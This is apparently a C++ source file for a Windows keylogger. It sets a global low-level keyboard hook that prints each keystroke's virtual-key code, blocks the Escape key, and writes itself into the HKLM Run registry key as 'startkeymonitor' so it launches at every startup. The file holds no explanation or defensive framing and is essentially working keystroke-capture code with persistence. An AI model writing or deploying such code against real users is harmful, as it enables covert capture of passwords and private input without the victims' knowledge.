#include "Windows.h"
#include <iostream>
#include <tchar.h>
using namespace std;

HHOOK hookHandle;

LRESULT CALLBACK keyHandler(int nCode, WPARAM wParam, LPARAM lParam);

void startUp(LPCTSTR path)
{
	BOOL isWOW64;
	REGSAM p;
	IsWow64Process(GetCurrentProcess(),&isWOW64);
	if (isWOW64){
		p = KEY_WRITE | KEY_WOW64_64KEY;
	}
	else{
		p = KEY_WRITE;
	}
	HKEY hKey;
	LONG createRt = RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, NULL, 0, p, NULL, &hKey, NULL);
	if (createRt != ERROR_SUCCESS){
		//失败
		DWORD word = GetLastError();

		return ;
	}
	//int tSizeof = sizeof(path);
	//int tt = sizeof(TCHAR);
	if (RegSetValueEx(hKey, TEXT("startkeymonitor"), 0, REG_SZ, (BYTE*)path, _tcslen(path) *sizeof(TCHAR))!= ERROR_SUCCESS){
		//失败
		return ;
	}
	RegCloseKey(hKey);
}

int main(int argc, char* argv[]) {

	TCHAR exeFullPath[256];
	GetModuleFileName(NULL,exeFullPath,MAX_PATH);
	
	startUp(exeFullPath);

	hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, keyHandler, NULL, 0);

	if(hookHandle == NULL) {
		cout << "ERROR CREATING HOOK: ";
		cout << GetLastError() << endl;
		getchar();
		return 0;
	}

	MSG message;

	while(GetMessage(&message, NULL, 0, 0) != 0) {
		TranslateMessage( &message );
		DispatchMessage( &message );
	}

	cout << "Press any key to quit...";
	getchar();

	UnhookWindowsHookEx(hookHandle);

	return 0;
}


LRESULT CALLBACK keyHandler(int nCode, WPARAM wParam, LPARAM lParam) {
	//cout << "Hello!" << endl;

	// Checks whether params contain action about keystroke
	if(nCode == HC_ACTION) {
		cout << ((KBDLLHOOKSTRUCT *) lParam)->vkCode << endl;
		if(((KBDLLHOOKSTRUCT *) lParam)->vkCode == VK_ESCAPE){
			return TRUE;
		}
	}

	return CallNextHookEx(hookHandle, nCode, 
		wParam, lParam);
}